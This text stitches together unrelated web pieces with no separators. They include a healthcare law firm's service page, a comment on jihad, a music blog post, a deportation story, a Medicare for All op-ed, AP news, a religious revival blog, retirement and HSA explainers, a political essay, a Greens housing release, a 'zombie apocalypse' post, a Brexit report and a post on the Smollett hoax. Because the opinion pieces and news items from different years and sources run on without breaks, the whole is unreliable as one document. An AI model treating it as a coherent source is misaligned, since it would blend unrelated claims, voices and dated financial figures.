Currently, providers and suppliers of services to patients covered by Medicare, Medicaid, and third-party health insurers are being placed under heightened scrutiny and are becoming more likely to be subject to increased audits due to billing issues. The main focus of an audit is to provide evidence that health insurers have been properly billed for any medical service provided to patients. When a health insurer has reported an allegation of overpayment the health care provider will have the opportunity to appeal that allegation. The appeals process for an alleged overpayment can be a stressful and burdensome process. With the help of skilled attorneys, this process can go more smoothly and effectively. When Medicare, Medicaid or private insurers allege improper billing, it is important to be represented by legal counsel throughout the process. READ MORE »
Litigation in State and Federal Courts
During audits of the healthcare provider, it is common that a health insurance entity will file a clawback action against the healthcare provider. Clawback actions are usually brought against healthcare providers by health insurance entities, such as Medicare, Medicaid, or private insurers, when there is a discrepancy over how much a patient is being charged for certain services. Clawback litigation will allow health insurers to seek the return of the funds they have distributed to healthcare providers. For example, Medicaid can claw back funds they disbursed for the care of a patient who is now deceased, or a health insurer can clawback funds disbursed for a patient who now has a canceled insurance policy. Clawback litigation ensues when a provider does not refund the monies when required. Blodnick Fazio attorneys represent healthcare providers in these types of matters. Additionally, our attorneys can assist with drafting clawback agreements that will specifically tailor the obligations of both the health insurance entity and the healthcare provider in order to reduce the likelihood of litigation.
Licensing Issues with the Office of Professional Medical Conduct
License investigations may arise for a variety of different reasons. Some of the most common reasons for licensing to be questioned is patient complaints or complaints from other healthcare providers. While some investigations may be closed quickly due to the allegation of having no merit, some other investigations can be open for a long time until the issue is resolved. Even with complaints that have no merit and seem to have ended quickly, it is important to have counsel present when speaking to any investigators as to protect your rights as well as the rights of your employees and your business.
Sales of Healthcare Practices
Buying or selling a healthcare practice is a unique transaction that comes with its own related laws and obligations. Our attorneys can help this process by drafting purchase agreements, developing management agreements where appropriate and helping to identify practices that may be possible candidates for purchasing or selling. The New York State Department of Health requires the filing of a change of ownership documents and the Centers for Medicare and Medicaid Services will also require their own 855 applications. Our legal team can ensure that you have the proper documentation filed to have a smooth transition during the buying and selling process. Additionally, we can provide assistance in determining the fair market value of your healthcare practice or another healthcare practice you are interested in purchasing.
Partnership, Shareholder and Operating Agreements
Partnership and shareholder disputes are common within the healthcare industry, therefore, having a properly drafted and executed agreement can help to avoid unnecessary difficulties as the practice progresses. Occasionally, the relationships you have with an employee, officer, director, or partner will sour and this can lead to a variety of issues such as the departure or the breakup of physicians in your healthcare business. This sort of turmoil affects everyone involved with the business and can stir up financial, ethical, professional, and emotional issues. While an effective partnership, shareholder or operating agreement is helpful during these uncertain times, it is possible that the agreements formed have not covered every issue, or the agreements have become stale with time. Our attorneys will work with you to ensure potential issues are properly addressed within the relevant agreements. If an issue may arise that is not covered by the agreement, a pre-litigation settlement may be negotiated in order to reach an amicable resolution.

Reader comment on item: What is Jihad?
Submitted by Anonymus (United Kingdom), Feb 15, 2009 at 07:49
There are two types of Jihad, lesser Jihad and Greater Jihad. Lets start of with Greater Jihad. Greater Jihad, is a struggle with oneself, for example battling with oneself to become perfect or gain enlightenment, whatever you would like to call it. This type of Jihad is the utlimate Jihad and is incomparable to the lesser Jihad. Lesser Jihad as Daniel Pipes stated is a struggle against evil. A couple of non-Muslims have been mentioning stuff like the Mumbai terrorists acted under the banner of Islam and Jihad tells them to blow themseleves up and hurt innocent civillians. I will paraphrase from the Quran, killing 1 person is the equivilent of killing the entire mankind. In reference to Geert Wilders, who recently was banned from entering the UK, he calls for freedom of speech yet wants to ban the Quran, he is being hypocritical.
I don't pretend to be a scholar of Islam but if you want the true meaning of Jihad go to the scholars and not a disgruntled and precieved version of the Islam by angry teenagers, like when researching Islam try to visit Islamic sites ...

Reasoned disagreement is welcome but not comments that are scurrilous, off-topic, commercial, disparaging religions, or otherwise inappropriate.

Rediscovering the Great ’70s Folk-Rocker John Martyn
November 24, 2013 Music, Review, streaming music, VideoDays of the Crazy-Wild, folk, folk-rock, John Martyn, live, May You Never, music, review, streaming music, The Island Years, Uncut, videoMichael Goldberg	
John Martyn’s Solid Air, released in 1973, is one of those timeless albums, an album that stands outside of time but also brings me back to those free-spirited years when I was a college student living at UC Santa Cruz.

Now a mammoth multi-CD box, The Island Years, has been released and Rob Young has written an informative review that provides a great overview of the late folk-rocker’s music.
Check it out at Uncut.
Here’s what might be his best song, “May You Never.” A live version from 1973:

Deporting Love
Inseparable couple, Enrique and Harlon were married June 2014. While pursuing their passion of developing affordable homes and revitalizing a community, the two worked towards a green card. After two successful Stay of Deportations and an immigration approved marriage, the couple is being deported! Under Trump, the recent Stay was denied. ICE has requested travel arrangements to the dangers of El Salvador. The couple must plan for the worst. This is their story!

Deporting Love: A Married Couple’s Journey to Stay in the United States
On November 28, 2005, Enrique Gonzalez walked across the border to pursue a safe and prosperous life in the U.S. Afraid of gang recruitment in El Salvador and seeking to escape to a safe place with opportunities to work to help himself and his family, after two days of processing and detention, he was taken (by immigration officials) to a Texas bus station where he was left to find his way in what would become his new home, the United States of America. Thirteen years later, with a U.S. Immigration approved marriage to a citizen, Enrique is being deported.
In the January 2017 Executive Order, Enhancing Public Safety in the Interior of the United States, the Trump administration laid out a much wider dragnet authorizing and empowering ICE in the deportation of undocumented. Unlike the discretion of the Obama Administration, as evidenced in the 2011 Memo, which exercised a great deal of flexibility the Trump Administration's laser-sharp focus is on the numbers! Every undocumented …

MUSIC: Indy's Perfect Mix Studios Sponsors the Gabriel Harley Band at "What About Us? A Peaceful Resistance Rally for Immigration Reform"
I have lived in Indy the majority of my life. Soon to be 50 years of age, thats a long time! In all that time, some friends come and some friends go and then there's other people whose paths we cross that simply become family. Gabriel Harley, his entire family, and his beautiful wife Dr. Corinne Renguette, are more than "BFF's" for Enrique and I. They are our family!
When it comes to tearing families apart with unjust deportations such as the fight we're all about today, many hearts are broken. For more than a decade (maybe two) we have made so many memories together. Gabe's mom, Ellen Harley and his dad, Zane Harley have graced our many parties over the years with fireside strumming, and incredible family love as music and compassion are simply a part of who they are. Gabriel Harley ooooozes music - the vibe of which can change the world! We're glad to have adopted he and his family as BFF, sisters, brothers, mom, and dad to Enrique and I.
We are honored to have the incredible Gabriel Harley Band to take the stage at "What About Us? A Peaceful Resistance Rally for Immigration Reform." It will be hot on Sunday so bring a pop up tent for you and invite a neighbor, wear lots of sunscreen, dress cool and cozy, don't forget your cooler, folding chair, and an open mind to take part in this truly historic event.
Sunday, July 15th, Irvingington Branch Library - 5625 E Washington St, Indianapolis, IN 46219.
We're changing the world for the better!

National Improved Medicare For All Making Progress – OpEd
January 6, 2018 Margaret Flowers 1 Comment
By Margaret Flowers
In The Road to Medicare for Everyone, Jacob Hacker is once again working to dissuade single payer healthcare supporters from demanding National Improved Medicare for All and use our language to send us down a false path. Hacker comes up with a scheme to convince people to ask for less and calls those who disagree “purists”. Hacker calls his “Medicare Part E” “daring and doable,” I call it dumb and dumber. Here’s why.
Hacker makes the same assertions we witnessed in August of 2017 when other progressives tried to dissuade single payer supporters.
He starts with “risk aversion,” although he doesn’t use the term in his article. Hacker asserts that those who have health insurance through their employers won’t want to give it up for the new system. Our responses to this are: there is already widespread dislike for the current healthcare system; people don’t like private insurance while there is widespread support across the political spectrum for Medicare and Medicaid; there is also widespread support for single payer; and those with health insurance can be reassured that they will be better off under a single payer system. It is also important to note that employers don’t want to be in the middle of health insurance. Healthcare costs are the biggest complaint by small and medium sized businesses and keep businesses that operate internationally less competitive.
Next, Hacker brings up the costs of the new system and complains that it will create new federal spending. He points to the failures to pass ‘single payer’ in Vermont and California. First, it must be recognized that the state bills were not true single payer bills, and second, states face barriers that the federal government does not, they must balance their budgets. Hacker ignores the numerous studies at the national level, some by the General Accounting Office and the Congressional Budget Office that demonstrate single payer is the best way to save money. Of course there would be an increase in federal spending, the system would be financed through taxes, but the taxes would replace premiums, co-pays and deductibles, which are rising as fast as health insurers can get away with. Hacker proposes a more complex system that will fail to provide the savings needed to cover everyone, the savings that can only exist under a true single payer system.
Hacker also confuses “Medicare for All” with simply expanding Medicare to everyone, including the wasteful private plans under Medicare Advantage. This is not what National Improved Medicare for All (NIMA) advocates support. NIMA would take the national infrastructure created by Medicare and use it for a new system that is comprehensive in coverage, including long term care, and doesn’t require co-pays or deductibles. The system would negotiate reasonable pharmaceutical prices and set prices for services. It would also provide operating budgets for hospitals and other health facilities and use separate capital budgets to make sure that health resources are available where they are needed. And the new system would create a mechanism for negotiation of payment to providers.
Finally, Hacker tries to convince his readers that the opposition to NIMA will be too strong, so we should demand less. We know that the opposition to our lesser demands will also be strong. That was the case in 2009 when people advocated for the ‘public option’ gimmick. If we are going to fight for something, if we are going to take on this opposition, we must fight for something worthwhile, something that will actually solve the healthcare crisis. That something is NIMA. We are well aware that the opposition will be strong, but we also know that when people organize and mobilize, they can win. Every fight for social transformation has been a difficult struggle. We know how to wage these struggles. We have decades of history of successful struggles to guide us.
One gaping hole in Hacker’s approach is that it prevents the social solidarity required to win the fight and to make the solution succeed. Hacker promotes a “Medicare Part E” that some people can buy into. Not only will this forego most of the savings of a single payer system, but it also leaves the public divided. Some people will be in the system and others will be out. This creates vulnerabilities for the opposition to exploit and further divide us. Any difficulties of the new system will be blown out of proportion and those in the system may worry that they are in the wrong place. When we are united in the same system, not only does that create a higher quality system (a lesson we’ve learned from other countries), but it also unites us in fighting to protect and improve that system.
Hacker succeeded in convincing people who support single payer to ask for something less in 2009 and we ended up with a law that is further enriching the health insurance, pharmaceutical and private healthcare institutions enormously while tens of millions of people go without care. Now, Hacker rises again to use the same scare tactics and accusations that he used then to undermine the struggle for NIMA. This is to be expected. The national cry for NIMA is growing and the power holders in both major political parties and their allies in the media and think tanks are afraid of going against the donor class. Social movements have always been told that what they are asking for is impossible, until the tide shifts and it becomes inevitable.
Our task is to shift the tide. We must not be fooled by people like Jacob Hacker. We know that single payer systems work. We have the money to pay for it. We have the framework for a national system and we have the institutions to provide care. Just as we did in 1965 when Medicare and Medicaid were created from scratch, and without the benefit of the Internet, we can create National Improved Medicare for All, a universal system, all at once. Everybody in and nobody out.
We know that we are close to winning when the opposition starts using our language to take us off track. “Medicare Part E” is not National Improved Medicare for All, it is a gimmick to protect the status quo and convince us that we are not powerful. We aren’t falling for it. This is the time to fight harder for NIMA. We will prevail.

House fails to override Trump veto of his border emergency
By ALAN FRAM, Associated Press

Updated Mar 26 2019 02:40PM EDT
WASHINGTON (AP) - The Democratic-controlled House fell short Tuesday in its effort to override President Donald Trump's first veto, handing him a victory in his effort to spend billions more for constructing barriers along the Southwest border than Congress has approved.
Lawmakers voted 248-181 in favor of overturning his veto, mostly along party lines, but that was 38 votes shy of the number needed for the required two-thirds majority.
The outcome, not a surprise, enabled Trump to move forward on an issue that was a hallmark of his 2016 presidential campaign and of his presidency. Yet the vote also gave Democrats a way to focus on policy differences with Trump, days after Attorney General William Barr gave the president a political boost by saying special counsel Robert Mueller had concluded that Trump had not colluded with Russia to influence his election.

SALT LAKE CITY (AP) - A Utah family has become the victim of extreme stalking involving unwanted service providers repeatedly being sent to their home, according to the homeowner and police.
Walt Gilmore's family in suburban Salt Lake City has been the target since August of a stalker using phone calls and texts to send a parade of people to the home for legitimate services and illegal activities, the Deseret News reported.
Up to 20 people per day arrive saying they were called to provide electrical, plumbing, tree-trimming, and towing services, according to Gilmore, who said some are seeking illegitimate business.

Published on: Oct 7, 2008
Sunday morning my wife and I went to the local Assemblies of God Sunday School class. We have no more interest in attending the services, but we do enjoy the interaction that the Sunday school class provides. As it turned out the class teacher had just come back from Buenos Aires having participated in the revival that began with Claudio Friedzon in 1992. So instead of a discussion they had brought back a video of a service for everyone to watch.
My wife turned to me and asked me if I would like to go. I said that I would like to watch for awhile. Four years ago when we attended another AOG congregation we helped put on a week long campaign hosted by the AOG college in Waxahachie, SAGU (Southwestern Assemblies of God University). So, this peaked my interest.
While I watched the video, I thought of Todd Bentley and the collapse of the Lakeland, FL revival (although I have read that it is still going on quietly in local congregations). The revival in Buenos Aires has transformed Argentina and continues unto this day some 16 years later. What a difference between the two! It occurred to me that the men in Argentina have more maturity and character, unlike Todd Bentley.
But that is not why the revival has transformed the nation of Argentina. We have many men of integrity that have led “revivals” in the 20th century with no sustained impact with the exception of the Azusa Street revival in California that brought upon the American church the gifts of the Spirit.
Then I realized that there are two factors that have played a significant role in the revival of Argentina that has not yet occurred in the USA. One is that during the 1980’s (and again in the late 1990’s) Argentina experienced a hyperinflation in their economy that caused the price of everything to rise 2000%. This caused widespread poverty for those who could not afford goods at the inflated prices. This created a great need for divine help. The other factor in the 80’s is the Falkland Island War between the United Kingdom and Argentina. Argentina is a Catholic nation, and the Catholic priests assured the people that they would win the war because God was on their side. When they lost the war to Great Britain, the Argentine people were demoralized and lost faith in the Catholic system. As providence had it, Protestant missionaries were there to fill in the void, and many Argentines switched sides. I was told this information by a staff member of Claudio Friedzon when I helped the SAGU campaign in Waxahachie.
Linda and I left the video after a while because it was obvious that the Sunday School teachers had hoped that by watching the video the class would experience the same “anointing”. The canned revival on tape will only impact hearts that are prepared, and the hearts in America are not prepared yet, which is why we have not had any sustained revivals in our country for 100 years. Also, while the power of God, no doubt was flowing in Buenos Aires, we could see the soul power and emotionalism which is standard fare in charismatic congregations, on this video, so we left. For those who only understand the term ‘soul power” as an expression from the 1960’s “black power”, that is not what I mean here. I am using it the way Watchman Nee uses it to describe the manipulation of emotions and moods by charismatic leaders.
But the video did bring me hope. Perhaps the collapse of Fannie Mae, Freddie Mac and the other bank institutions is the answer to prayer for revival in the USA by God. The congressional bailout is not going to fix the problem. The problem is systemic to the Federal Reserve System which is a congressional sacred cow that allows them spend recklessly without accountability. So you can be sure that the Feds are going to flood more fiat money into the American economy to aid this problem (which I believe the banking dynasties orchestrated through Congress), and Americans are going to experience hyper inflation similar to what Argentina experienced.
It is evident that great need in people causes them to turn to God for help. I believe that we are going to see more disasters (not that God has created them, but He will use them) that is going to be the things that prepare the hearts of Americans for real revival. The Lakeland revival fizzled due to immorality. Immorality increases with prosperity, which is what happened in Sodom and Gommorah which were rich communities. As long as Americans remain materialistic because of the debt economy, immorality will continue, and the charismatic camps tend to lean towards the prosperity message and not the self denial of the cross of Christ. But when it collapses, saints, your prayers for revival in America will truly be answered. I do not want the collapse, but I will be glad for revival that follows in its wake. And for that I will praise the Lord!

God’s Word says in Proverbs 3:25-26, 33-34, to “Have no fear of sudden disaster or of the ruin that overtakes the wicked, for the LORD will be your confidence and will keep your foot from being snared. . . The LORD’s curse is on the house of the wicked, but he blesses the home of the righteous. Ho mocks proud mockers but gives grace to the humble.”

David,
Very good words of comfort. The more I think about the problems of the future, the more convinced I am that a real revival is coming!

Unforgettable Birthdays
Birthdays may seem less important as you grow older. They may not offer the impact of watershed moments such as getting a driver’s license at 16 and voting at 18. But beginning at age 50, there are several key birthdays that can affect your tax situation, health-care eligibility, and retirement benefits.
50 — Taxable distributions from IRAs and qualified employer retirement plans before age 59½ are generally subject to a 10% early distribution penalty (20% for certain SIMPLE plan distributions) on top of any federal income taxes due. But if you are a qualified public safety employee you can take penalty-free withdrawals from your qualified retirement plan after leaving your job if your employment ends during or after the year you reach age 50.
55 — If you're not a qualified public safety employee, you can take penalty-free withdrawals from your qualified retirement plan after leaving your job if your employment ends during or after the year you reach age 55.
59½ — And all withdrawals from qualified retirement plans and IRAs are penalty-free after you reach age 59½, whether or not you're still employed. Ordinary income taxes generally apply to these distributions. (Withdrawals taken prior to age 59½ may be subject to a 10% federal income tax penalty.)
62 — You are eligible to start collecting Social Security benefits, although your benefit will be reduced by up to 30%. To receive full benefits, you must wait until “full retirement age,” which ranges from 66 to 67 depending on the year you were born.
65 — You are eligible to enroll in Medicare. Medicare Part A hospital insurance benefits are automatic for those eligible for Social Security. Part B medical insurance ­ben­efits are voluntary and have a monthly premium. To obtain coverage at the ­earliest possible date, you should generally enroll about two to three months before turning 65.1
70½ — You must start taking minimum distributions from most tax-deferred retirement plans or face a 50% penalty on the amount that should have been withdrawn. Annual required minimum distributions are calculated according to life expectancies determined by the federal government.

“Liberaltarianism” Is a Sideshow

No self-respecting left can make opposition to “rent-seeking” its focus.

Most people love attention, me no less than anyone. So I’m happy to respond to my learned friend Henry Farrell’s challenge to the argument I made in my critical review of The Captured Economy, the new book by our mutual friend Steven Teles and Brink Lindsey.
The object of that book is to map a new territory of cooperation between Left and Right, for the sake of traditional progressive goals. In pursuit of this political project, a new philosophy is offered, summed up by the term “liberaltarianism,” and further described as “anti-state egalitarianism.”
Let me say that in principle I have no objection to couplings of strange bedfellows in progressive causes, and my record proves it. Back in the early days of blogs, I launched a left-right blog known as “Stand Down” to campaign against the US invasion of Iraq. I assembled luminaries from the world of blogging, including Markos Moulitsas (Daily Kos), Duncan “Atrios” Black (Eschaton), Tom Tomorrow, Julian Sanchez (Notes from the Lounge), Radley Balko (The Agitator), and Jim Henley (Unqualified Offerings), among many others.
More recently I’ve been pleased to see left-right initiatives towards “auditing the Fed” and mildly encouraged by some of Senator Rand Paul’s bloviations against US imperialism.
My difference with the Lindsey-Teles (LT) book lies in the fact that these were tactical gambits, not the stuff of some new political philosophy meant to command broad acclaim or a position of prominence in the Left’s agenda.
The crown jewel of LT’s appeal is the rising proliferation of economic rents accruing to the very wealthy over recent decades — certainly a tempting target for the Left. Both LT and Henry suggest that rents are at the root of the historic growth in inequality. Unfortunately for Henry’s argument, if you’re traveling with Dean Baker — whose imprimatur LT and Henry both try to claim — the increase in inequality in the US is not a story of rents received by asset owners. Rather, as Dean explains in his book on the subject, it resulted from increasing inequality in labor compensation. (Piketty is name-checked in LT’s book, though rents play no part in Piketty’s account.)
But LT’s leading cases of rent-seeking — financial deregulation, occupational licensing, intellectual property, and the restriction of urban housing supply due to rent control and zoning — only partly overlap with rents received in the form of high wage and salary income. In contrast, an overriding factor in the growing inequality of labor income — for some the most important one — is something unappetizing for the liberaltarian palate: the withering of trade unionism and industrial action. Few factors run more against the grain of nostrums of competitive markets.
Farrell, making a point for trade unionism, breaks a lance for John Kenneth Galbraith’s idea that unions represent a form of “countervailing power” (also invoked by LT). Now I love me some JKG, always have, but from where I sit this defense, welcome though it has always been, comes from a stance of liberal noblesse oblige, an appeal to fellow elites. No self-respecting left would defend unions as a mere device to allow labor to strike some kind of unsatisfactory balance with capital. It’s the posture of a benevolent elite. For the time being we’ll take what we can get, but for the future what we on the Left want is no gods, no masters.
Farrell says, with the benefit of private assurances from LT, that unionism is in keeping with the thrust of their argument: rent-seeking that promotes equality is better than other types that do not. But unionism is vulnerable to the same arguments they deploy against occupational licensure or rent control or zoning, all cases where the distributional implications are either ambiguous, contestable, limited, or mitigated by other considerations.
Limited space precluded me, in my review, from expressing my sympathy for another theme in LT: the importance of democratic deliberation. The idea here is that rents die in the sunlight of open discussion and debate.
Unfortunately, the past couple of weeks in Washington DC may have rendered this focus a political nonstarter, and perhaps even a handicap. We’ve already witnessed the shenanigans that led to the enthronement of Trump’s first Supreme Court nominee. Now for the sake of a monumentally perverse, rent-choked tax reform, the Republican Party has abandoned all norms of democratic deliberation, not to say elementary human decency, to an unprecedented extent.
It takes two to deliberate democratically. To pretend otherwise amounts to unilateral political disarmament. You can’t fight malicious distributional policy with appeals to process. Farrell and LT neglect the possibility that it will be necessary to fight fire with fire. Bernie Sanders understands that.
If liberaltarians want to tail the burgeoning progressive movements in the US, they can be welcomed. But the tail is not going to wag the dog.

Anglicare snapshot shows that it’s time for urgent action on housing affordability crisis
April 30, 2015
An important new Rental Affordability Snapshot from Anglicare highlights the need for broad reforms to housing policy and tenancy laws to address the crisis in the state’s housing sector, warn the Greens.
Jenny Leong, Greens MP for Newtown and Rental Housing spokesperson, said:
“The Greens have a plan for improving the rights of renters in Sydney to ease rental stress and provide people who are renting with more security.
“Rent increases in Sydney are out of control. The average cost to rent a two bedroom apartment or house in Redfern has jumped from $350 to a staggering $650 a week in the last ten years.
“Over the past months I have been speaking with many residents in the inner city and inner west who are really concerned about astronomical rents and ever-increasing insecurity.
“The Greens will introduce legislation into NSW Parliament to protect renters’ rights, including putting an end to ‘no grounds’ evictions and limiting rent increases. We must put in place provisions to protect those most vulnerable from dodgy landlords and housing insecurity.
“If our initiatives had been in place over the last 10 years, average rents would have risen just 38 per cent, not the 77 per cent we’ve actually seen. Greens initiatives would have seen a saving $126 a week for renters in a 2 bedroom house.
“The Greens will work with organisations like Anglicare to advocate and campaign for effective improvements to housing and tenancy legislation in NSW,” Ms Leong said.
Jan Barham, Greens MP and spokesperson on Housing and Homelessness, said:
“Last year the Parliamentary housing inquiry I initiated delivered 41 recommendations to improve social and affordable housing in NSW, which were welcomed by many in the housing and social service sectors as a blueprint to address the housing crisis.
“The Government chose to ignore the inquiry’s recommendations, hiding behind the caretaker provisions to avoid responding when the report had been available for six months. The Government must respond to the inquiry recommendations that were based on detailed evidence from experts in the sector.
“Right now, the Government could support the community housing sector to boost social housing by giving certainty about title transfers. They could implement planning measures to ensure local governments can ensure affordable housing is included in new housing developments.
Ms Barham also called on the NSW Government to lock in key housing partnerships with the federal government and ensure the impacts of federal tax policy on housing affordability are considered.
“The State Government needs to act quickly to commit funding and secure federal commitments to allocate funding for long-term housing programs, including the National Partnership Agreement on Homelessness and the National Affordable Housing Agreement.
“The NSW Government must highlight the impact of federal tax policy in driving housing costs to unaffordable levels. They need to push for a federal discussion of reforms to negative gearing and the capital gains tax discount to reduce price pressures and deliver additional housing,” Ms Barham concluded.

Zombie Apocalypse
Posted on October 5, 2012 by Michael A. Michail	Posted in Uncategorized	— No Comments ↓	
I’ve had several dreams lately of a Zombie Apocalypse.
I’m with a group of survivors hopelessly trying to fight off the onslaught of zombies bent on eating our brains and converting us into one of the mindless horde. Of course there is no way to escape the inevitable: the sheer number of attacking zombies seals our fate. The government, such as it is, has collapsed, there is no rescue possible, and it is just a matter of time before we are consumed.
Pretty scary stuff.
But I’ve come to realize that the Apocalypse is already upon us. We’re surrounded by zombies right now and they are thriving. Their numbers are growing and they will soon over take the world.
Current estimates place the population of the world at about 7 Billion people.
By my calculation there are 6 Billion sleepwalking “normals”; 250 Million zombies; 1 Million sorcerers who strive to create as many zombies as possible out of the sleepwalking population; and about 750 Million awake or partially awake individuals.
Now 750 Million partially awake individuals sounds like a lot – and it actually indicates more people awake today then have existed in the past 20,000 years combined. However, wakefulness has traditionally come upon the world very slowly. Whereas it appears that zombies are multiplying quite rapidly.
By my reckoning, the zombie population will double every 5 years. So, in 2017 there will be 500 Million zombies. In 2022, there will be 1 Billion zombies. In 2027, there will be 2 Billion zombies. In 2032, there will be 4 Billion zombies. And by 2037, in just 25 years, there will be 8 Billion zombies – at which point the world will be lost.
People on Earth, under normal circumstances, wake up very slowly – maybe a few thousand per year – and this could be our downfall. Since sorcerers can only make zombies out of the sleepwalking masses, our one great hope will be to wake people up as quickly as possible.
To prevent a Zombie Apocalypse, more people than ever have to be awakened as quickly as possible.
So, anyone who is reading this blog who wants to help the human species –WAKE UP!
Wake yourself up as soon as possible.
And then, go out and wake everyone else up. The more awakened people there are, the fewer sleepwalkers there will be that can be converted into zombies.
Wake up now and perhaps the world will be saved.

Jeremy Hunt Warns "Brexit Paralysis" Could Lead To UK Remaining In EU
LONDON (Alliance News) - Foreign Secretary Jeremy Hunt has warned of "Brexit paralysis" if MPs ...
Alliance News 11 January, 2019 | 4:44PM
LONDON (Alliance News) - Foreign Secretary Jeremy Hunt has warned of "Brexit paralysis" if MPs vote down UK Prime Minister Theresa May's Withdrawal Agreement next week, potentially meaning the UK does not leave the EU at all.
Hunt warned that failure to deliver Brexit would be "incredibly damaging" for the UK and something the country would regret for "many, many generations".
He appealed to MPs who have spent months fighting for their "number one top favourite outcome" to come together behind a Withdrawal Agreement which is "not perfect" but "broadly delivers Brexit".
Hunt suggested that legally binding assurances from Brussels over the deal's controversial backstop arrangements should be enough to allay the fears of many MPs over the long-term impact of the Agreement.
European Commission president Jean-Claude Juncker said discussions were continuing with No 10 as to what form such assurances could take, as he warned that a no-deal would be a "catastrophe".
"We are checking with Downing Street what the clarifications could amount to. They should not be confused with a renegotiation," he said during a visit to Romania.
He added: "I don't like the prospect of a no-deal. It would be a catastrophe."
Meanwhile, Work & Pensions Secretary Amber Rudd said she is "committed" to ensuring that the UK does not leave without a deal.
During an interview with BBC Radio 4's Today programme, Rudd three times declined to say whether she would remain a member of the government if it opted for a no-deal Brexit.
The Cabinet ministers were speaking as MPs prepared for the third day of debate in the House of Commons ahead of next Tuesday's crunch vote, with Home Secretary Sajid Javid opening proceedings which are expected to be dominated by the issue of migration.
In a significant shift of tone apparently designed to win over hardline Brexiteers who have set their faces against May's deal, Hunt warned that defeat next week would not necessarily provide MPs with the opportunity to choose their preferred version of Brexit.
Warning that there may be no consensus in the Commons around any possible outcome, the Foreign Secretary told Today: "If this deal is rejected, ultimately what we may end up with is not a different type of Brexit but Brexit paralysis."
"And Brexit paralysis ultimately could lead to no Brexit."
"I'm saying this would be an incredibly damaging breach of trust and it would also be very bad for Britain's reputation abroad, having decided to leave the EU, if we in the end for whatever reasons found we weren't able to do it."
Hunt warned: "If we were, as a political class, not to deliver Brexit, that would be a fundamental breach of trust between the people and the politicians."
"I think that is something that we would regret for many, many generations."
Insisting that he had not given up hope of victory in next week's vote, he said: "What is important is for MPs on all sides, Brexiters and Remainers, whatever our disagreements, to say 'We are democrats and the most important thing now is to make sure that we really do deliver Brexit'."
He warned Eurosceptics that they may not be able to rely on the clock ticking down to the default option of a no-deal Brexit on March 29 if May's deal is voted down.
It was not possible for the minority Tory administration to control what happened in Parliament, and Speaker John Bercow had shown that he was "willing to frustrate the government at every opportunity", he said.
"I think it's now looking much less likely that Parliament would allow a no-deal outcome anyway," said Hunt. "We have seen from this week that Parliament has the ability to assert itself and to shape outcomes."
"I think Parliament is very committed to try to stop no-deal, but I think we have to recognise that there is a deal on the table, it does broadly deliver the Brexit people voted for, and if we don't find a way to get this through, we are taking some very big risks."
May was boosted on Thursday by two Tory backbenchers – her former policy adviser George Freeman, and Trudy Harrison – indicating they will back her deal, as well as by a call from Japanese PM Shinzo Abe for the UK to avoid no-deal.
And the prime minister made efforts to reach out to Labour and the unions in an 11th-hour bid to salvage a vote which she is expected to lose by a wide margin.
Asked whether she agreed with Hunt that the UK can thrive after a no-deal Brexit, Rudd told Today: "This is a strong and great country, we will find a way to succeed, but I do not think that no deal would be good for this country and I'm committed to making sure we find an alternative."
Rudd said it was "right" for the government to make preparations for a no-deal Brexit, comparing it to wearing a seatbelt when driving a fast car.
But she said: "I intend to work with colleagues to make sure we avoid it. I am committed to getting the best outcome for this country, which is supporting the prime minister's deal."
Pressed for a third time by interviewer Justin Webb on whether she would quit if May went for the no-deal option, Rudd cut him short by saying: "Thank you very much, Justin."

The Morningstar Star Rating for Stocks is assigned based on an analyst's estimate of a stocks fair value. It is projection/opinion and not a statement of fact. Morningstar assigns star ratings based on an analyst’s estimate of a stock's fair value. Four components drive the Star Rating: (1) our assessment of the firm’s economic moat, (2) our estimate of the stock’s fair value, (3) our uncertainty around that fair value estimate and (4) the current market price. This process culminates in a single-point star rating that is updated daily. A 5-star represents a belief that the stock is a good value at its current price; a 1-star stock isn't. If our base-case assumptions are true the market price will converge on our fair value estimate over time, generally within three years. Investments in securities are subject to market and other risks. Past performance of a security may or may not be sustained in future and is no indication of future performance. For detail information about the Morningstar Star Rating for Stocks, please visit here
Quantitative Fair Value Estimate represents Morningstar’s estimate of the per share dollar amount that a company’s equity is worth today. The Quantitative Fair Value Estimate is based on a statistical model derived from the Fair Value Estimate Morningstar’s equity analysts assign to companies which includes a financial forecast of the company. The Quantitative Fair Value Estimate is calculated daily. It is a projection/opinion and not a statement of fact. Investments in securities are subject to market and other risks. Past performance of a security may or may not be sustained in future and is no indication of future performance. For detail information about the Quantiative Fair Value Estimate, please visit here

What the Jussie Smollett hoax hate crime shows us about left-wing bias
Posted on 25 februari 2019 by Peter A. Dykstra
I can guarantee you if someone staged a fake hate crime against Obama supporters, lied about it, tried to cover it up, continued to deny it in the face of a ton evidence, that person wouldn’t be allowed to go back to a TV set straight from the courthouse as if nothing happened
— Charlie Kirk (@charliekirk11) February 22, 2019
This Turning Point USA video features a compilation of actual political violence that received far less media attention than the Jussie Smollett hoax:
Hey Jussie Smollett! The Real Violence Is Against Conservatives Who Dare To Think For Themselves! #LiveFree pic.twitter.com/N1vBotmYjt
— Turning Point USA (@TPUSA) February 21, 2019
Just hours after @TheRealRoseanne made a joke on Twitter that hurt some people's feelings, she was fired from the very show she created. Weeks after Jussie Smollette tried to pull off the biggest hate crime hoax in decades, he still has a job.

Health Savings Account: Funding an HSA Could Help You Prep for Retirement
By one estimate, the average 65-year-old couple retiring in 2017 could spend more than $404,000 on health-care expenses in retirement. This figure includes lifetime premiums for Medicare, supplemental insurance, dental coverage, deductibles, coinsurance, and other out-of-pocket costs.1
The primary purpose of a health savings account (HSA) is for workers to set aside pre-tax income to pay current and future medical expenses not covered by health insurance. This is why HSAs are sometimes called Medical IRAs. They incentivize saving with three powerful tax advantages: (1) the dollars you contribute are deducted from your adjusted gross income, (2) investment earnings compound tax-free inside the HSA, and (3) withdrawals are untaxed if the money is spent on qualified health-care expenses. (Depending on the state, HSA contributions and earnings may or may not be subject to state taxes.)
Another benefit is that account funds not needed for health expenses are available for any other purpose after you reach age 65. When HSA money is spent on anything other than qualified medical expenses, withdrawals are taxed as ordinary income but don’t incur the 20% penalty that applies to taxpayers under age 65.
Eligibility and Contribution Limits
To be eligible to establish or contribute to an HSA in 2019, you must be enrolled in a qualifying high-deductible health plan (an HDHP with a deductible of at least $1,350 for individuals, $2,700 for families). Qualifying HDHPs also have out-of-pocket maximums, above which the insurer pays all costs. In 2019, the upper limit is $6,750 for individual coverage or $13,500 for family coverage, but plans may have lower caps. This feature could help you budget accordingly for a worst-case scenario.
